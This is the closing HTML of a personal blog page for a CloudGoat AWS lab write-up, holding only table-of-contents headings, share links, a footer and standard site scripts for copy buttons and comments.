class="toc-number">2.2.</span> <span class="toc-text">2. Subscribing to an SNS Topic using Pacu</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Accessing-the-API-Gateway-and-Get-a-Flag"><span class="toc-number">2.3.</span> <span class="toc-text">3. Accessing the API Gateway and Get a Flag</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/250306-cloudgoat-scenario01-sns_secrets/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/250306-cloudgoat-scenario01-sns_secrets/&text=CloudGoat scenario 01 - sns_secrets (AWS, Pacu)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/250306-cloudgoat-scenario01-sns_secrets/&title=CloudGoat scenario 01 - sns_secrets (AWS, Pacu)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/250306-cloudgoat-scenario01-sns_secrets/&is_video=false&description=CloudGoat scenario 01 - sns_secrets (AWS, Pacu)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CloudGoat scenario 01 - sns_secrets (AWS, Pacu)&body=Check out this article: https://jiravvit.github.io/250306-cloudgoat-scenario01-sns_secrets/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/250306-cloudgoat-scenario01-sns_secrets/&title=CloudGoat scenario 01 - sns_secrets (AWS, Pacu)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/250306-cloudgoat-scenario01-sns_secrets/&title=CloudGoat scenario 01 - sns_secrets (AWS, Pacu)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/250306-cloudgoat-scenario01-sns_secrets/&title=CloudGoat scenario 01 - sns_secrets (AWS, Pacu)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/250306-cloudgoat-scenario01-sns_secrets/&title=CloudGoat scenario 01 - sns_secrets (AWS, Pacu)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/250306-cloudgoat-scenario01-sns_secrets/&name=CloudGoat scenario 01 - sns_secrets (AWS, Pacu)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/250306-cloudgoat-scenario01-sns_secrets/&t=CloudGoat scenario 01 - sns_secrets (AWS, Pacu)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2022-2025
    HyeonJi Son
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'jiravvit-github-io';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
